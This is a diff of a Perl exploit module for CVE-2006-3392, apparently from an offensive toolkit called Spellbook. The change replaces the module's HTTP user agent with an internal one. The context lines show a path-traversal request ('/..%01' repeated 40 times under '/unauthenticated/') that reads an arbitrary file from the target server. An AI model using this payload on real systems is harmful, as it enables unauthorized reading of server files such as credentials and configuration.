@@ -2,8 +2,8 @@ package Spellbook::Advisory::CVE_2006_3392 {
     use strict;
     use warnings;
     use Try::Tiny;
-    use LWP::UserAgent;
-
+    use Spellbook::Core::UserAgent;
+    
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, $file);
@@ -20,9 +20,7 @@ package Spellbook::Advisory::CVE_2006_3392 {
                 $target = "https://$target";
             }
             
-            my $ua = LWP::UserAgent -> new (
-                ssl_opts => { verify_hostname => 0 }
-            );
+            my $ua = Spellbook::Core::UserAgent -> new();
 
             my $temp      = "/..%01" x 40;
             my $target    = $target . "/unauthenticated/" . $temp . $file;
